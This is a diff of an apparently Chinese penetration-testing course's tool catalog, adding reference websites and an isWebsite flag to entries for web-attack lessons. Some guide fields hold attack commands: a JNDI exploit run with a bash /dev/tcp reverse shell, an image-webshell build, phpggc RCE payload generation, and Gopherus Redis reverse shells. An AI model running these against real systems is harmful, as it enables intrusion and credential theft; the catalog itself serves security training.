                         "guide": "下载 zip 源码解压至 phpStudy 的 `WWW` 根目录下，浏览器访问 `http://localhost/upload-labs` 即可立即开始打靶练习。",
                         "downloadUrl": "https://github.com/c0ny1/upload-labs/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "MDN Web Docs (MIME 类型标准规范大全)",
+                        "category": "官方网站 / Web 技术规范",
+                        "purpose": "【小白白话通俗理解】Mozilla 官方出品的最权威 Web 技术百科，完整收录了所有合法的 Content-Type MIME 媒体类型定义与浏览器解析规则。",
+                        "guide": "在线查阅常见图片（image/jpeg, image/png）与可执行文件的标准 MIME 格式。",
+                        "downloadUrl": "https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1650,7 +1982,8 @@ Behinder Client
                         "purpose": "【小白白话通俗理解】能看到文件底层每一个十六进制字节（0x00~0xFF）的专业编辑器。用来分析文件头魔数（如 PNG: 89 50 4E 47）、精确插入 00 截断字节与合成图片木马。",
                         "guide": "下载 Windows 安装包安装。打开任意正常图片，在文件末尾追加 PHP 木马代码即可制作图片马。",
                         "downloadUrl": "https://www.sweetscape.com/010editor/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -1708,7 +2041,8 @@ copy /b normal.jpg + shell.php webshell.jpg
                         "purpose": "【小白白话通俗理解】当网站不小心把 `/.git/` 文件夹暴露在公网上时，这个工具能顺着版本索引把整个网站的所有历史源代码和配置文件 100% 完整下载重构到你本地！",
                         "guide": "Python 2/3 工具。下载后在命令行执行 `python GitHack.py http://target.com/.git/`，还原的代码会自动保存在 `dist/` 目录中。",
                         "downloadUrl": "https://github.com/lijiejie/GitHack",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "dirsearch (高并发 Web 敏感目录与文件扫描器)",
@@ -1716,7 +2050,17 @@ copy /b normal.jpg + shell.php webshell.jpg
                         "purpose": "【小白白话通俗理解】全自动'网站探宝机器人'。自动快速扫描网站上是否存在 `www.zip` 备份、`admin/` 后台、`.env` 配置文件与 `api.json` 接口。",
                         "guide": "在命令行执行 `pip install dirsearch`，使用 `dirsearch -u http://target.com -e php,txt,zip,bak` 启动扫描。",
                         "downloadUrl": "https://github.com/maurosoria/dirsearch/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "Swagger UI 官方演示与规范",
+                        "category": "官方网站 / 接口文档",
+                        "purpose": "【小白白话通俗理解】开源 API 接口文档框架官方网站。如果开发人员上线时未关闭该端点，黑客可通过 Swagger UI 直接调试调用全部内部未公开接口！",
+                        "guide": "在线体验 Swagger UI 接口交互与直接发包调用流程。",
+                        "downloadUrl": "https://petstore.swagger.io/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1767,11 +2111,21 @@ copy /b normal.jpg + shell.php webshell.jpg
           tools: [
             {
                         "name": "XSS'OR (在线 XSS 编码与 Payload 转换平台)",
-                        "category": "在线工具 / 编码转换",
+                        "category": "在线平台 / 编码转换",
                         "purpose": "【小白白话通俗理解】XSS 测试利器。支持 HTML 实体编码、Unicode 编码、URL 编码、十六进制转换与常用 XSS 攻击载荷快速生成。",
                         "guide": "无需下载安装，在浏览器中打开网址即可在线输入和转换各种 XSS 载荷。",
                         "downloadUrl": "https://xssor.io/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "OWASP XSS Filter Evasion Cheat Sheet",
+                        "category": "官方网站 / 权威绕过备忘录",
+                        "purpose": "【小白白话通俗理解】全球应用安全权威机构 OWASP 出品的 XSS 过滤绕过大全，收录了上百种利用 HTML5 新标签、特殊事件与编码绕过 WAF 的经典技巧。",
+                        "guide": "在线查阅各类复杂上下文环境下的 XSS 逃逸 Payload。",
+                        "downloadUrl": "https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1823,7 +2177,8 @@ XSS 是指恶意攻击者向 Web 页面中注入恶意客户端脚本（主要�
                         "purpose": "【小白白话通俗理解】'浏览器控制总指挥部'。只要受害者点开包含 BeEF 钩子的一行 JS 代码，受害者的浏览器就会瞬间变成攻击者的傀儡，可远程弹出伪造登录框窃取密码、探测内网端口！",
                         "guide": "Kali Linux 官方软件源已内置，执行 `sudo apt update && sudo apt install beef-xss` 即可一键安装，运行 `beef-xss` 启动服务。",
                         "downloadUrl": "https://github.com/beefproject/beef/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "XSStrike (高级自动化 XSS 检测引擎)",
@@ -1831,7 +2186,17 @@ XSS 是指恶意攻击者向 Web 页面中注入恶意客户端脚本（主要�
                         "purpose": "【小白白话通俗理解】专为绕过各种 XSS 防护设计的智能模糊测试引擎，能分析当前输入上下文环境并自动生成最高效的免杀逃逸 Payload。",
                         "guide": "下载后在 Python 环境下运行：`python xsstrike.py -u \"http://target.com/search?q=test\"`。",
                         "downloadUrl": "https://github.com/s0md3v/XSStrike/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "XSS Hunter 在线盲打接收平台",
+                        "category": "在线平台 / 盲打平台",
+                        "purpose": "【小白白话通俗理解】当 XSS 触发在管理员后台无法直接看到时（盲打 XSS），注入 XSS Hunter 探针，管理员在后台一打开页面，探针会自动把后台完整截图和 Cookie 发送给黑客！",
+                        "guide": "注册账号获取专属探针代码，在后台静候盲打数据上线通知。",
+                        "downloadUrl": "https://xsshunter.turing.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1881,7 +2246,8 @@ BeEF 是业界顶级的专业浏览器漏洞利用框架。通过在受害者浏
                         "purpose": "【小白白话通俗理解】覆盖 SQL 注入脱库、后台文件上传绕过与动态加密 Webshell 权限维持的红蓝对抗经典三件套。",
                         "guide": "启动 phpStudy 本地靶机，依次使用 Burp 抓包、Sqlmap 导出账号密码、登录后台上传 Webshell 并使用冰蝎客户端连接提权。",
                         "downloadUrl": "https://github.com/rebeyond/Behinder/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -1933,7 +2299,17 @@ BeEF 是业界顶级的专业浏览器漏洞利用框架。通过在受害者浏
                         "purpose": "【小白白话通俗理解】一键生成'借刀杀人'恶意网页。拦截转账请求后，点一下菜单就能自动生成一个包含自动提交脚本的 HTML 页面，发给受害者点击即可复现漏洞！",
                         "guide": "在 Burp Suite 中拦截任意 POST 请求，右键选择 `Engagement tools` ➔ `Generate CSRF PoC` 即可一键生成并在浏览器中预览。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "MDN SameSite Cookie 官方规范文档",
+                        "category": "官方网站 / 浏览器安全规范",
+                        "purpose": "【小白白话通俗理解】深入了解现代浏览器如何通过 Strict / Lax / None 属性彻底杜绝跨站请求伪造 (CSRF) 攻击的底层标准。",
+                        "guide": "查阅各主流浏览器对 SameSite 默认值的演进历史与配置建议。",
+                        "downloadUrl": "https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie/SameSite",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -1989,7 +2365,17 @@ CSRF 被称为“借刀杀人”攻击。受害者在浏览器中登录了目标
                         "purpose": "【小白白话通俗理解】最强大的网络请求命令行。支持 HTTP、HTTPS、FTP、DICT、FILE、GOPHER 等几十种网络协议，是测试 SSRF 伪协议的黄金工具。",
                         "guide": "Windows 10/11 系统已原生内置 cURL。在 CMD 中输入 `curl -v \"http://target.com\"` 即可使用。",
                         "downloadUrl": "https://curl.se/download.html",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "DNS Rebinding 在线测试平台 (rbndr.us)",
+                        "category": "在线平台 / SSRF 绕过",
+                        "purpose": "【小白白话通俗理解】自动生成支持 DNS 重绑定的特殊域名，通过配置 0 秒 TTL 让域名在合法外网 IP 与 127.0.0.1 之间高速交替，突破内网 IP 白名单限制！",
+                        "guide": "在网页中输入 A IP 和 B IP，系统会自动生成形如 `7f000001.08080808.rbndr.us` 的重绑定测试域名。",
+                        "downloadUrl": "https://lock.cmpxchg8b.com/rebinder.html",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2036,7 +2422,8 @@ SSRF 是指攻击者利用服务端提供了请求外部资源的功能（如图
                         "purpose": "【小白白话通俗理解】专治内网各种未授权服务。只要输入反弹 Shell 的 IP 和端口，它能自动生成直接能打 Redis、MySQL、FastCGI、Memcached 的 `gopher://` 格式完整攻击数据流！",
                         "guide": "Python 脚本工具。下载后在命令行执行 `python gopherus.py --exploit redis`，按提示输入目标反弹 IP 即可直接输出攻击 Payload。",
                         "downloadUrl": "https://github.com/tarunkant/Gopherus",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2115,7 +2502,17 @@ value
                         "purpose": "【小白白话通俗理解】向目标服务器发送包含恶意 `<!DOCTYPE>` 和 `<!ENTITY>` 外部实体的 XML 数据，查看服务器是否把本地秘密文件解析并读取出来。",
                         "guide": "使用 Burp Repeater 修改请求头为 `Content-Type: application/xml`，并在请求体中填入 XXE 载荷发送测试。",
                         "downloadUrl": "https://portswigger.net/burp/communitydownload",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "W3Schools XML DTD 官方教程",
+                        "category": "在线平台 / 语法教程",
+                        "purpose": "【小白白话通俗理解】从零基础学习 XML 文档结构、外部实体 (SYSTEM) 与通用实体语法声明的标准教程。",
+                        "guide": "在线查看 DTD 语法示例与浏览器解析机制。",
+                        "downloadUrl": "https://www.w3schools.com/xml/xml_dtd.asp",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2174,7 +2571,8 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】一行命令在自己电脑上开一个网页服务器，用来存放恶意的 `eval.dtd` 文件并实时接收目标服务器无回显外带出来的 Base64 密码数据。",
                         "guide": "在包含 dtd 文件的目录下打开命令行，输入 `python -m http.server 8000` 即可秒级开启监听并在控制台实时查看访客日志。",
                         "downloadUrl": "https://www.python.org/downloads/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2225,11 +2623,21 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
           tools: [
             {
                         "name": "CyberChef (网络安全'瑞士军刀'万能编解码工坊)",
-                        "category": "全能编解码 / 逆向转换",
+                        "category": "在线平台/软件 / 全能编解码",
                         "purpose": "【小白白话通俗理解】英国情报机构 GCHQ 开源的超级数据处理神器。支持 URL、Base64、Hex、Gzip、AES、异或、反转字符串等上百种操作自由拖拽拼接！",
                         "guide": "支持网页在线使用，也支持下载离线单 HTML 文件在本地直接双击打开，纯绿色无需安装任何环境。",
-                        "downloadUrl": "https://github.com/gchq/CyberChef/releases",
-                        "isOfficial": true
+                        "downloadUrl": "https://gchq.github.io/CyberChef/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "RevShells (在线全语言反弹 Shell 命令生成器)",
+                        "category": "在线平台 / 实战生成工具",
+                        "purpose": "【小白白话通俗理解】全网最好用的反弹 Shell 备忘录生成器。只要填入监听 IP 和端口，能一键自动生成 Bash、Python、PHP、PowerShell、NC 等十几种语言的稳定反弹命令！",
+                        "guide": "在网页中勾选【Base64 编码】或【URL 编码】可一键生成 WAF 免杀命令。",
+                        "downloadUrl": "https://www.revshells.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2284,7 +2692,8 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】针对 Apache Tomcat 8009 端口 AJP 协议漏洞的专用工具，能够免登录直接读取 Tomcat 部署的 webapps 目录下任意敏感源码与配置文件。",
                         "guide": "在命令行执行 `python CVE-2020-1938.py target_ip -p 8009 -f /WEB-INF/web.xml` 即可读取文件。",
                         "downloadUrl": "https://github.com/YDJSIR/CVE-2020-1938-GhostCat",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2328,7 +2737,26 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】用来复现 Log4j2、Fastjson、Spring 等 Java 高危漏洞的一站式 LDAP/RMI 服务端，能自动生成 `${jndi:ldap://...}` 触发指令并在目标靶机上全自动执行反弹 Shell！",
                         "guide": "下载编译好的 jar 包，在命令行运行 `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -i >& /dev/tcp/ip/port 0>&1\" -A \"your_ip\"` 启动服务。",
                         "downloadUrl": "https://github.com/welk1n/JNDI-Injection-Exploit/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "NVD 美国国家漏洞数据库",
+                        "category": "官方网站 / 漏洞标准库",
+                        "purpose": "【小白白话通俗理解】美国国家标准与技术研究院 (NIST) 维护的全球漏洞标准数据库，提供 CVSS 评分计算与详尽漏洞补丁说明。",
+                        "guide": "在线检索 Log4j2 与 Fastjson 历史漏洞的 CVSS 3.1 评分与攻击向量分析。",
+                        "downloadUrl": "https://nvd.nist.gov/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Apache Log4j2 安全通告官方页面",
+                        "category": "官方网站 / 官方安全公告",
+                        "purpose": "【小白白话通俗理解】Apache 官方针对 Log4Shell (CVE-2021-44228) 漏洞发布的影响版本范围、官方补丁与防护缓解方案指南。",
+                        "guide": "查阅官方推荐的升级版本与 `log4j2.formatMsgNoLookups=true` 禁用参数。",
+                        "downloadUrl": "https://logging.apache.org/log4j/2.x/security.html",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2374,7 +2802,8 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】集成了 SSRF 内网穿透、Redis 未授权反弹 Shell 与 Java 框架反序列化远程代码执行的进阶渗透工具组。",
                         "guide": "配合本地 Docker 搭建的 Redis 与 Log4j2 靶场环境，进行从 Web 边界向内网横向移动的全流程复现。",
                         "downloadUrl": "https://github.com/welk1n/JNDI-Injection-Exploit/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2422,7 +2851,8 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】国内中小型企业与网管最常用的 Webshell 查杀软件。能深度扫描磁盘，快速揪出隐藏的一句话木马、畸形后门与投毒 DLL 动态库。",
                         "guide": "Windows 绿色单文件。解压后运行 `D_Safe.exe`，选择要查杀的网站目录，点击'立即查杀'即可生成详细报告。",
                         "downloadUrl": "http://www.d9soft.com/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2463,7 +2893,26 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】专门针对国内主流 OA 系统（泛微、致远、用友、通达、蓝凌）的自动化漏洞扫描与利用神器，内置数百个经过验证的高危 1day PoC。",
                         "guide": "在命令行执行 `python vulmap.py -u \"http://target-oa.com\" --app=weaver` 即可自动探测和利用已知高危漏洞。",
                         "downloadUrl": "https://github.com/zhzyker/vulmap/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "致远互联官方网站",
+                        "category": "官方网站 / 协同管理软件",
+                        "purpose": "【小白白话通俗理解】国内主流协同管理软件厂商官方门户，了解 Seeyon A8/A6 架构与政企办公生态。",
+                        "guide": "查阅官方发布的最新产品架构与安全补丁更新公告。",
+                        "downloadUrl": "https://www.seeyon.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "泛微协同办公官方网站",
+                        "category": "官方网站 / OA 行业领军",
+                        "purpose": "【小白白话通俗理解】泛微网络官方网站，展示 e-cology、e-office、e-weaver 移动办公架构与工作流引擎体系。",
+                        "guide": "查阅官方安全运营与补丁包升级中心。",
+                        "downloadUrl": "https://www.weaver.com.cn/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2515,7 +2964,8 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】国内安全圈公认口碑最好的漏洞扫描神器！支持作为代理串联在 Burp 后面，你在浏览器里正常点点网页，它在后台全自动挖掘 SQL 注入、XSS、SSRF 和命令执行并生成漂亮的 HTML 报告！",
                         "guide": "单文件免安装。在命令行中执行 `xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output report.html` 启动被动代理监听。",
                         "downloadUrl": "https://github.com/chaitin/xray/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "Rad 自动化智能浏览器爬虫",
@@ -2523,7 +2973,26 @@ $doc->loadXML($xml_data, LIBXML_NOENT);
                         "purpose": "【小白白话通俗理解】长亭官方配套的高性能无头爬虫。能像真人一样自动在目标网站上点击按钮、填写表单，将抓取到的所有深度链接自动喂给 Xray 扫描！",
                         "guide": "下载后在命令行执行 `rad_windows_amd64.exe -t http://target.com -http-proxy 127.0.0.1:7777` 联动 Xray 实现全自动扫描。",
                         "downloadUrl": "https://github.com/chaitin/rad/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "Xray 官方中文在线文档",
+                        "category": "在线平台 / 官方文档",
+                        "purpose": "【小白白话通俗理解】长亭官方维护的 Xray 全参数使用手册、YAML PoC 编写语法与 Burp/Rad 联动配置指南。",
+                        "guide": "在线查阅 Xray 高级配置（如反连平台、子域名扫描、漏洞忽略规则）。",
+                        "downloadUrl": "https://docs.xray.cool/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "长亭科技安全技术社区 (CT Stack)",
+                        "category": "在线平台 / 安全社区",
+                        "purpose": "【小白白话通俗理解】长亭官方技术社区，汇聚海量安全工程师分享的最新 PoC 插件与实战红蓝对抗经验。",
+                        "guide": "在社区中下载和交流最新的 Xray 社区 PoC 规则插件。",
+                        "downloadUrl": "https://stack.chaitin.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2573,7 +3042,8 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】AI 界的'Docker'。只要一行命令，就能在自己电脑上本地下载并运行 DeepSeek、Llama 3、Qwen 等顶尖大模型，断网也能用，完全不用担心数据泄露！",
                         "guide": "下载 Windows 安装包双击安装，在命令行运行 `ollama run deepseek-r1:8b` 即可立即开始与大模型对话。",
                         "downloadUrl": "https://ollama.com/download",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "Chatbox (开源跨平台大模型桌面客户端)",
@@ -2581,7 +3051,35 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】精美的大模型聊天窗口。可以连接本地 Ollama 或各类云端 API，支持自定义 System Prompt、代码高亮与提示词工程调试。",
                         "guide": "下载 Windows 安装包一键安装，在设置中选择模型提供商为 `Ollama` 即可开始调试 Prompt 提示词注入漏洞。",
                         "downloadUrl": "https://chatboxai.app/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "OWASP Top 10 for LLM Applications 官方网站",
+                        "category": "官方网站 / AI 安全标准",
+                        "purpose": "【小白白话通俗理解】全球最权威的大模型安全标准库，详细定义了 Prompt 注入、敏感数据泄露、供应链漏洞等 10 大 AI 核心安全风险。",
+                        "guide": "在线查阅针对大模型应用的威胁建模与安全防护指南。",
+                        "downloadUrl": "https://llmtop10.owasp.org/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Hugging Face (全球开源 AI 模型社区)",
+                        "category": "在线平台 / 全球模型库",
+                        "purpose": "【小白白话通俗理解】AI 领域的'GitHub'。全世界最前沿的开源开源大模型权重、安全对齐数据集与评测基准均在这里首发下载。",
+                        "guide": "在线搜索和体验全球数万款顶尖开源大模型与微调权重。",
+                        "downloadUrl": "https://huggingface.co/",
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "Ollama 官方模型库 (Library)",
+                        "category": "官方网站 / 模型目录",
+                        "purpose": "【小白白话通俗理解】Ollama 官方支持的一键下载模型清单（涵盖 DeepSeek-R1、Llama3、Mistral、Qwen 等）。",
+                        "guide": "浏览各类量化版本（4bit/8bit）并获取一行启动命令。",
+                        "downloadUrl": "https://ollama.com/library",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2623,12 +3121,22 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
           localFiles: ["51-利用AI实现智能漏洞分析与渗透赋能.pdf"],
           tools: [
             {
-                        "name": "DeepSeek / ChatGPT 开发者 API 平台",
-                        "category": "AI 赋能 / 智能分析",
-                        "purpose": "【小白白话通俗理解】利用大模型顶级的代码阅读与上下文推理能力，辅助安全工程师自动分析混淆木马、编写 PoC 验证脚本和生成安全修复补丁。",
-                        "guide": "在官方平台申请 API Key，配合 Python 脚本调用大模型接口进行自动化 AST 语法分析与代码审计。",
+                        "name": "DeepSeek 开发者开放平台",
+                        "category": "在线平台 / 顶尖国产大模型",
+                        "purpose": "【小白白话通俗理解】国内顶尖的推理大模型平台，其强大的长文本理解与代码逻辑分析能力，是辅助代码审计与免杀木马反混淆的绝佳助手！",
+                        "guide": "注册账号获取 API Key，支持通过标准 OpenAI 格式 SDK 接入自己的自动化安全工具中。",
                         "downloadUrl": "https://platform.deepseek.com/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": true
+            },
+            {
+                        "name": "OpenAI 开发者 API 平台",
+                        "category": "在线平台 / 全球 AI 领军",
+                        "purpose": "【小白白话通俗理解】GPT-4o 开发者接口，提供多模态图像识别与强大的代码生成能力，辅助快速生成漏洞验证 PoC。",
+                        "guide": "在控制台中配置 API 密钥并查看调用用量统计。",
+                        "downloadUrl": "https://platform.openai.com/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2672,7 +3180,8 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】手机逆向界的'内存手术刀'。在 App 正在运行的时候，动态把一段 JavaScript 注入到 App 内存里，强行修改 App 的判断逻辑（如强行把证书校验改成'永远信任'）！",
                         "guide": "在电脑端执行 `pip install frida frida-tools`，手机端下载对应架构的 `frida-server` 并在手机 Root 终端中启动后台运行。",
                         "downloadUrl": "https://github.com/frida/frida/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "JADX (Dex 到 Java 逆向反编译神器)",
@@ -2680,7 +3189,17 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】把安卓手机安装包（.apk）直接还原成 Java 源代码的图形化神器。把 apk 拖进窗口，就能像看源码一样搜索接口、密码和关键函数！",
                         "guide": "免安装 Java 工具。解压后直接双击 `bin/jadx-gui.bat` 运行，把目标 App 的 apk 文件直接拖入窗口即可查看源码。",
                         "downloadUrl": "https://github.com/skylot/jadx/releases",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "Frida 官方英文技术文档",
+                        "category": "官方网站 / 动态 Hook 教程",
+                        "purpose": "【小白白话通俗理解】Frida 官方 API 全景说明书，包含 Java.perform、Interceptor.attach 等常用 Hook 核心语法与示例。",
+                        "guide": "在线查阅针对 Android 与 iOS 平台的动态插桩操作指南。",
+                        "downloadUrl": "https://frida.re/docs/home/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2732,7 +3251,8 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】国内普及率最高的新手代码审计工具。只要把整套网站源码目录选进来，它能一键自动扫描出所有包含 SQL 注入、文件包含、命令执行的高危代码行！",
                         "guide": "Windows 绿色免安装版。解压后双击 `Seay源代码审计系统.exe` 运行，点击【新建项目】选择源码文件夹即可一键生成审计报告。",
                         "downloadUrl": "https://github.com/f1ret/Seay",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "PhpStorm + Xdebug 动态单步调试套件",
@@ -2740,7 +3260,8 @@ Xray 支持基于 YAML 的轻量级 PoC 插件编写，包含 \`set\`（随机�
                         "purpose": "【小白白话通俗理解】专业级代码断点调试环境。可以在代码任意一行下断点，一步一步看着变量从用户输入一步步传递到数据库执行的全过程。",
                         "guide": "下载 PhpStorm 并安装，在 phpStudy 的 php.ini 中开启 `[xdebug]` 扩展并配置 `xdebug.remote_enable = 1` 即可联动断点调试。",
                         "downloadUrl": "https://www.jetbrains.com/phpstorm/download/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2788,7 +3309,8 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】微软出品的轻量级现代化代码编辑器。利用其超高速的全局正则表达式搜索（Ctrl+Shift+F），秒级检索 Source 输入源与 Sink 危险汇聚点。",
                         "guide": "下载 Windows 安装包一键安装，推荐安装 PHP Intelephense 与 Chinese (Simplified) 插件。",
                         "downloadUrl": "https://code.visualstudio.com/Download",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2835,7 +3357,17 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】专门用于测试 JSON Web Token (JWT) 安全性的自动化利器，支持 `alg: none` 签名剥离、敏感 Payload 篡改伪造与弱密钥离线字典爆破。",
                         "guide": "在命令行执行 `python jwt_tool.py <JWT_STRING> -T` 即可对 Token 进行全自动化的安全缺陷扫描。",
                         "downloadUrl": "https://github.com/ticarpi/jwt_tool",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "jwt.io (在线 JWT 调试与解码平台)",
+                        "category": "在线平台 / 官方调试工具",
+                        "purpose": "【小白白话通俗理解】Auth0 官方维护的在线 JWT 解码器。粘贴一段密文 Token，网页能实时将 Header、Payload 和 Signature 解密为清晰明了的 JSON 格式！",
+                        "guide": "在网页中直接修改 Payload 中的角色字段，直观观察 Token 结构变化。",
+                        "downloadUrl": "https://jwt.io/",
+                        "isOfficial": true,
+                        "isWebsite": true
             }
 ],
 
@@ -2876,7 +3408,8 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】PHP 反序列化界的'瑞士军刀'。内置了 ThinkPHP、Laravel、Symfony、Yii、CodeIgniter 等数十种主流框架成熟的 POP 攻击链，输入命令就能直接生成攻击字符串！",
                         "guide": "在 Linux/Windows 命令行运行 `php phpggc ThinkPHP/RCE1 system \"whoami\"` 即可自动输出序列化 Payload。",
                         "downloadUrl": "https://github.com/ambionics/phpggc",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2937,7 +3470,8 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】用于在本地执行 PHP 脚本，生成包含恶意元数据的 `poc.phar` 文件并伪装为图片马。",
                         "guide": "下载 Windows 绿色版 PHP Zip 包，解压后将目录路径添加到系统环境变量 Path 中，在 php.ini 中设置 `phar.readonly = Off`。",
                         "downloadUrl": "https://windows.php.net/download/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             }
 ],
 
@@ -2987,7 +3521,8 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】专注于 Linux 与 Windows Web 目录后门查杀的高性能工具。拥有千万级特征库与行为分析引擎，能精准识别各类隐藏变形的 Webshell。",
                         "guide": "Linux 服务器上一键安装运行：`curl -fsSL https://www.shellpub.com/hm-linux-amd64.tgz -o hm.tgz && tar -zxf hm.tgz && ./hm scan /var/www/`。",
                         "downloadUrl": "https://www.shellpub.com/",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
             },
             {
                         "name": "Sysinternals Suite (微软官方高级系统排查工具箱)",
@@ -2995,7 +3530,26 @@ Source (不可信输入源)
                         "purpose": "【小白白话通俗理解】微软官方出品的'系统透视镜'。包含 Process Explorer（排查隐藏恶意进程）、Autoruns（排查所有自启动项与注册表后门）等数十个王牌排查工具。",
                         "guide": "解压后直接双击运行 `procexp.exe` 或 `Autoruns.exe`，无需安装，是 Windows 应急响应必备工具。",
                         "downloadUrl": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite",
-                        "isOfficial": true
+                        "isOfficial": true,
+                        "isWebsite": false
+            },
+            {
+                        "name": "360 应急响应中心官方网站",
+                        "category": "官方网站 / 应急指导手册",
+                        "purpose": "【小白白话通俗理解】360 官方安全应急响应中心，发布权威的《360网络安全应急响应指导手册》与勒索病毒解密工具。",
+                        "guide": "在线学习标准化的 Windows 与 Linux 应急响应处置流程规范。",
